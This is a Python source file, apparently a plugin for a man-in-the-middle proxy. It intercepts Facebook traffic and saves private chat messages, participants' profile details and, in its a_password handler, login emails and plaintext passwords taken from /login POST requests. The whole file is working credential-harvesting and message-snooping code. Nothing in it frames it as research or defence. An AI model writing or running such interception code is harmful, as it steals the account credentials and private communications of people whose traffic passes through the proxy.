
from base import *


class Facebook(Catcher):
    def __init__(self):
        hosts = [r"facebook\.com"]
        paths = [ r"^/login", r"^/pull", r"ajax/mercury"]
        super(Facebook, self).__init__(hosts, paths)

    @catcher
    def a_message_batch(self, flow):
        saved = 0
        if flow.request.method != "POST": return

        data = PostData(flow.request, 'message_batch')

        for i in xrange(0, 99):
            if data.val(i, 'message_id') is None: return

            author = data.val(i, 'author')
            in_chat = []
            for p in xrange(0,99):
                recipient = data.val(i, 'specific_to_list', p)
                if recipient is None: 
                    break
                in_chat.append(recipient)

            fact = {'kind': 'message',
                    'id': data.val(i, 'message_id'),
                    'content': data.val(i, 'body'),
                    'frm': clean_fbid(author),
                    'to': map(clean_fbid, in_chat),
                    'time': int(data.val(i, 'timestamp'))/1000
            }
            self.save(flow, fact)
            saved+=1
        return saved

    @catcher
    def a_ms_pull(self, flow):
        saved = 0
        data = fb_json(flow.response)
        if data is None: return
        msgs = select(data, 'ms', type='m_messaging')
        if msgs is None: return
#        print "a_ms_pull msgs:", msgs
        for m in msgs:
            content = m.get('message', None) or m.get('snippet', None)
            if content:
                fact = {'kind': 'message',
                        'content': content,
                        'frm':m['author_fbid'],
                        'frm_name': m['author_name'],
                        'to':m['participant_ids'],
                        'to_name': m['thread_name'],
                        'id':m['tid'],
                }
                print "LOG", fact
                self.save(flow, fact)
                saved += 1
        return saved
    
    @catcher
    def a_thread_sync(self, flow):
        saved = 0
        data = fb_json(flow.response)
        if data is None: return
        participants = select(data, 'payload', 'participants')
        if participants is None: return
        for p in participants:
            fact = {'kind': 'user',
                    'id': clean_fbid(p['id']),
                    'nick': p['vanity'],
                    'picture': p['big_image_src'],
                    'name': p['name'],
                    'gender': p['gender']
                }
            self.save(flow, fact, selector={'id': fact['id']})
            saved += 1
        return saved

    @catcher
    def a_password(self,flow):
        if flow.request.method != 'POST': return
        if not flow.request.path.startswith("/login"): return
        data = PostData(flow.request)
        fact  = {
            'kind': 'cred',
            'provider': 'facebook',
            'id': data.val('email'),
            'email': data.val('email'),
            'password': data.val('pass')
        }
        pprint(data.data)
        self.save(flow, fact)
        return 1

